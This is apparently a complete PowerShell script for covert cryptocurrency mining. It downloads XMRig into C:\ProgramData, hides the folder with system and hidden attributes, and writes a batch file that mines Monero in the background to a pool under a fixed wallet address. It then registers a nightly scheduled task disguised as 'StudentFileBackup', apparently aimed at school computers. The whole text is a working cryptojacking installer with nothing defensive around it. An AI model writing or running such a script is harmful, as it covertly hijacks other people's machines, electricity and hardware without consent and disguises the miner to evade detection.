cd C:\ProgramData

# download XMRig archive
iwr https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-gcc-win64.zip -OutFile xmrig.zip

# inflate XMRig archive
Expand-Archive ./xmrig.zip

# remove XMRig archive
rm ./xmrig.zip

# hide XMRig folder
attrib +s +h ./xmrig

# go to XMRig folder
cd xmrig
cd xmrig-6.8.2

# create starter file
powershell -Command "ni starter.bat"
powershell -Command "ac -Path ./starter.bat -Value 'cd C:\ProgramData\xmrig\xmrig-6.8.2'"
powershell -Command "ac -Path ./starter.bat -Value 'xmrig.exe -o pool.minexmr.com:443 --user=42PAm8cXjypLyXVHjapkRJjD29dBAoBR7Z8PeT1K5ASdR2GUwWmhWaQWrm1qAsSXRtCzW9HpufiqHCEcL7m8wLmkUYdSue1 --keepalive --tls --algo=cn --background --randomx-mode=light --cpu-priority=2'"

schtasks /create /sc daily /tn StudentFileBackup /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /st 20:00 /et 06:30 /k
